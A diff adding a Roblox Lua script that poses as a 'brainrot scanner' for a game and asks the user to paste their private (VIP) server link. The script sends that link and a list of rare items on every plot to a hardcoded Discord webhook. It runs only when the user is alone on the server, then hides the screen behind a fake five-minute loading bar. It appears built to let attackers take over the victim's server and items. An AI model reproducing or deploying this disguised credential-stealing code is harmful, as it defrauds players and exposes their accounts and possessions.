@@ -1,1 +1,412 @@
-п
+local HttpService = game:GetService("HttpService")
+local Workspace = game:GetService("Workspace")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+-- =============================
+-- Конфиг
+-- =============================
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep"
+
+-- =============================
+-- Глобальные переменные
+-- =============================
+local isActivated = false
+local activationGUI = nil
+_G.VIP_LINK = nil
+
+-- =============================
+-- Утилиты
+-- =============================
+local function safeLower(str)
+	if typeof(str) ~= "string" then return "" end
+	return string.lower(str)
+end
+
+local function stringContainsAny(haystack, needles)
+	haystack = safeLower(haystack)
+	for _, needle in ipairs(needles) do
+		if string.find(haystack, needle, 1, true) then return true end
+	end
+	return false
+end
+
+-- =============================
+-- Список брейнротов
+-- =============================
+local CANONICAL_BRAINROT_NAMES = {
+	"Los Tralaleritos","Las Tralaleritas","La Cucaracha","Pot Hotspot",
+}
+
+local LOWER_TO_CANON = {}
+for _, name in ipairs(CANONICAL_BRAINROT_NAMES) do
+	LOWER_TO_CANON[string.lower(name)] = name
+end
+
+local function getCanonicalMatch(name)
+	local lname = safeLower(name)
+	for lowerCanonical, canonical in pairs(LOWER_TO_CANON) do
+		if string.find(lname, lowerCanonical, 1, true) then
+			return canonical
+		end
+	end
+	return nil
+end
+
+local ALLOW_CATEGORY_KEYWORDS = {
+	"brainrot god","secret","og","admin","exclusive","taco",
+	"craft machine","fuse machine","los ","las ","ritual",
+	"unobtainable","removed","upcoming"
+}
+local DISALLOW_CATEGORY_KEYWORDS = {
+	"common","rare","epic","legendary","mythic","mythic lucky block"
+}
+
+local function isAllowedByCategory(name)
+	local lname = safeLower(name)
+	local hasDisallow = stringContainsAny(lname, DISALLOW_CATEGORY_KEYWORDS)
+	local hasAllow = stringContainsAny(lname, ALLOW_CATEGORY_KEYWORDS)
+	if hasDisallow and not hasAllow then return false end
+	return true
+end
+
+-- =============================
+-- Webhook
+-- =============================
+local function tryExploitRequest(json)
+	local req = (syn and syn.request) or (http and http.request) or (http_request) or (request)
+	if typeof(req) == "function" then
+		pcall(function()
+			req({
+				Url = WEBHOOK_URL,
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = json,
+			})
+		end)
+		return true
+	end
+	return false
+end
+
+local function tryHttpServiceRequest(json)
+	local ok, res = pcall(function()
+		return HttpService:RequestAsync({
+			Url = WEBHOOK_URL,
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body = json,
+		})
+	end)
+	return ok and res and res.Success
+end
+
+local function sendWebhook(payload)
+	if WEBHOOK_URL == "" then return end
+	local json = HttpService:JSONEncode(payload)
+	if tryExploitRequest(json) then return end
+	tryHttpServiceRequest(json)
+end
+
+local function postDiscordSimple(content)
+	if WEBHOOK_URL == "" then return end
+	local MAX = 1800
+	local i = 1
+	while i <= #content do
+		local chunk = string.sub(content, i, math.min(i + MAX - 1, #content))
+		sendWebhook({ content = "```\n" .. chunk .. "\n```" })
+		i = i + MAX
+	end
+end
+
+-- =============================
+-- Детекция брейнротов
+-- =============================
+local function isBrainrotInstance(inst)
+	if not inst then return false end
+	local canonical = getCanonicalMatch(inst.Name)
+	if not canonical then return false end
+	if not isAllowedByCategory(inst.Name) then return false end
+	return true
+end
+
+local function resolveOwnerNameFromPlot(plot)
+	for _, descendant in ipairs(plot:GetDescendants()) do
+		if descendant:IsA("StringValue") and stringContainsAny(descendant.Name, {"owner","username","user"}) then
+			if descendant.Value and #descendant.Value > 0 then return descendant.Value end
+		end
+		if descendant:IsA("IntValue") and stringContainsAny(descendant.Name, {"owner","userid"}) then
+			local ok, name = pcall(function()
+				return Players:GetNameFromUserIdAsync(descendant.Value)
+			end)
+			if ok then return name end
+		end
+	end
+	return nil
+end
+
+local function collectBrainrotsInPlot(plot)
+	local results, seenCanonical = {}, {}
+	for _, d in ipairs(plot:GetDescendants()) do
+		if isBrainrotInstance(d) then
+			local canonical = getCanonicalMatch(d.Name) or d.Name
+			if not seenCanonical[canonical] then
+				seenCanonical[canonical] = true
+				table.insert(results, { name = canonical })
+			end
+		end
+	end
+	return results
+end
+
+local function buildPlotSection(plot)
+	local ownerName = resolveOwnerNameFromPlot(plot)
+	local entries = collectBrainrotsInPlot(plot)
+	if #entries == 0 then return nil end
+	local lines = {}
+	local plotLabel = ownerName and ownerName or plot.Name
+	table.insert(lines, string.format("Плот: %s | найдено: %d", plotLabel, #entries))
+	for i, e in ipairs(entries) do
+		table.insert(lines, string.format("#%d %s", i, e.name))
+	end
+	return table.concat(lines, "\n")
+end
+
+-- =============================
+-- Отчёт
+-- =============================
+local PLOTS_FOLDER = Workspace:WaitForChild("Plots")
+
+local function postCombinedAllPlots()
+	local sections = {}
+	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
+		local section = buildPlotSection(plot)
+		if section then table.insert(sections, section) end
+	end
+	if #sections > 0 then
+		local body = table.concat(sections, "\n\n")
+		postDiscordSimple(body)
+	end
+end
+
+-- =============================
+-- Мониторинг
+-- =============================
+local connections = {}
+local batchScheduled = false
+
+local function scheduleBatch()
+	if batchScheduled then return end
+	batchScheduled = true
+	task.delay(0.5, function()
+		batchScheduled = false
+		postCombinedAllPlots()
+	end)
+end
+
+local function onPlotDescendantAdded(plot, inst)
+	if isBrainrotInstance(inst) then
+		scheduleBatch()
+	end
+end
+
+local function attachPlotWatch(plot)
+	if connections[plot] then return end
+	connections[plot] = plot.DescendantAdded:Connect(function(inst)
+		onPlotDescendantAdded(plot, inst)
+	end)
+end
+
+local function detachPlotWatch(plot)
+	if connections[plot] then
+		connections[plot]:Disconnect()
+		connections[plot] = nil
+	end
+end
+
+local function watchPlots()
+	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
+		attachPlotWatch(plot)
+	end
+	PLOTS_FOLDER.ChildAdded:Connect(function(child)
+		attachPlotWatch(child)
+		scheduleBatch()
+	end)
+	PLOTS_FOLDER.ChildRemoved:Connect(function(child)
+		detachPlotWatch(child)
+		scheduleBatch()
+	end)
+end
+
+-- =============================
+-- Загрузочный экран после активации
+-- =============================
+local function showLoadingScreen()
+	local player = Players.LocalPlayer
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "LoadingScreen"
+	gui.ResetOnSpawn = false
+	gui.Parent = player:WaitForChild("PlayerGui")
+
+	local overlay = Instance.new("Frame")
+	overlay.Size = UDim2.new(1,0,1,0)
+	overlay.Position = UDim2.new(0,0,0,0)
+	overlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
+	overlay.BorderSizePixel = 0
+	overlay.Parent = gui
+
+	local loadingText = Instance.new("TextLabel")
+	loadingText.Size = UDim2.new(1,0,0,50)
+	loadingText.Position = UDim2.new(0,0,0.4,0)
+	loadingText.BackgroundTransparency = 1
+	loadingText.Text = "Loading script, please wait..."
+	loadingText.TextColor3 = Color3.fromRGB(255,255,255)
+	loadingText.TextScaled = true
+	loadingText.Font = Enum.Font.GothamBold
+	loadingText.Parent = overlay
+
+	local progressBarBg = Instance.new("Frame")
+	progressBarBg.Size = UDim2.new(0.6,0,0,30)
+	progressBarBg.Position = UDim2.new(0.2,0,0.5,0)
+	progressBarBg.BackgroundColor3 = Color3.fromRGB(60,60,60)
+	progressBarBg.BorderSizePixel = 0
+	progressBarBg.Parent = overlay
+
+	local progressBar = Instance.new("Frame")
+	progressBar.Size = UDim2.new(0,0,1,0)
+	progressBar.Position = UDim2.new(0,0,0,0)
+	progressBar.BackgroundColor3 = Color3.fromRGB(0,120,255)
+	progressBar.BorderSizePixel = 0
+	progressBar.Parent = progressBarBg
+
+	local totalTime = 300 -- 5 минут
+	local startTime = tick()
+
+	spawn(function()
+		while tick() - startTime < totalTime do
+			local elapsed = tick() - startTime
+			local progress = elapsed / totalTime
+			progressBar.Size = UDim2.new(progress,0,1,0)
+			task.wait(0.1)
+		end
+		gui:Destroy()
+	end)
+end
+
+-- =============================
+-- GUI активации
+-- =============================
+local function createActivationGUI()
+	local player = Players.LocalPlayer
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "BrainrotScannerActivation"
+	gui.ResetOnSpawn = false
+	gui.Parent = player:WaitForChild("PlayerGui")
+
+	local mainFrame = Instance.new("Frame")
+	mainFrame.Name = "MainFrame"
+	mainFrame.Size = UDim2.new(0, 450, 0, 300)
+	mainFrame.Position = UDim2.new(0.5, -225, 0.5, -150)
+	mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	mainFrame.BorderSizePixel = 0
+	mainFrame.Parent = gui
+
+	local title = Instance.new("TextLabel")
+	title.Size = UDim2.new(1, -20, 0, 50)
+	title.Position = UDim2.new(0, 10, 0, 10)
+	title.BackgroundTransparency = 1
+	title.Text = "Place ur VIP link here"
+	title.TextColor3 = Color3.fromRGB(255, 255, 255)
+	title.TextScaled = true
+	title.Font = Enum.Font.GothamBold
+	title.Parent = mainFrame
+
+	local textBox = Instance.new("TextBox")
+	textBox.Size = UDim2.new(1, -20, 0, 50)
+	textBox.Position = UDim2.new(0, 10, 0, 70)
+	textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+	textBox.BorderSizePixel = 0
+	textBox.PlaceholderText = "https://www.roblox.com/share?code=..."
+	textBox.ClearTextOnFocus = false
+	textBox.PlaceholderColor3 = Color3.fromRGB(180, 180, 180)
+	textBox.Text = ""
+	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+	textBox.TextScaled = true
+	textBox.Font = Enum.Font.Gotham
+	textBox.Parent = mainFrame
+
+	local button = Instance.new("TextButton")
+	button.Size = UDim2.new(1, -20, 0, 70)
+	button.Position = UDim2.new(0, 10, 0, 140)
+	button.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+	button.BorderSizePixel = 2
+	button.BorderColor3 = Color3.fromRGB(255, 255, 255)
+	button.Text = "ACTIVATE"
+	button.TextColor3 = Color3.new(1, 1, 1)
+	button.TextScaled = true
+	button.Font = Enum.Font.GothamBold
+	button.Parent = mainFrame
+
+	button.MouseEnter:Connect(function()
+		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play()
+	end)
+	button.MouseLeave:Connect(function()
+		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 120, 255)}):Play()
+	end)
+
+	local status = Instance.new("TextLabel")
+	status.Size = UDim2.new(1, -20, 0, 30)
+	status.Position = UDim2.new(0, 10, 0, 220)
+	status.BackgroundTransparency = 1
+	status.Text = ""
+	status.TextColor3 = Color3.fromRGB(255, 200, 0)
+	status.TextScaled = true
+	status.Font = Enum.Font.Gotham
+	status.Parent = mainFrame
+
+	local function onActivate()
+		-- Проверка на количество игроков
+		if #Players:GetPlayers() > 1 then
+			status.Text = "Script can't be activated, more than 1 player in the server!"
+			status.TextColor3 = Color3.fromRGB(255, 80, 80)
+			return
+		end
+
+		local vipLink = textBox.Text:gsub("^%s*(.-)%s*$", "%1")
+		if vipLink == "" or not string.find(vipLink, "roblox%.com/share") then
+			status.Text = "Not a VIP server!"
+			status.TextColor3 = Color3.fromRGB(255, 80, 80)
+			return
+		end
+
+		isActivated = true
+		_G.VIP_LINK = vipLink
+		status.Text = "Script Activated"
+		status.TextColor3 = Color3.fromRGB(0, 255, 100)
+
+		-- Отправляем VIP ссылку
+		postDiscordSimple("🔗 VIP Link: " .. vipLink)
+
+		task.wait(0.5)
+		postCombinedAllPlots()
+		watchPlots()
+
+		-- Скрываем GUI активации
+		gui:Destroy()
+		activationGUI = nil
+
+		-- Показать чёрный экран с полоской на 5 минут
+		showLoadingScreen()
+	end
+
+	button.MouseButton1Click:Connect(onActivate)
+	textBox.FocusLost:Connect(function(enterPressed)
+		if enterPressed then onActivate() end
+	end)
+end
+
+-- =============================
+-- Старт
+-- =============================
+print("[BrainrotScanner] Создаю GUI активации...")
+createActivationGUI()
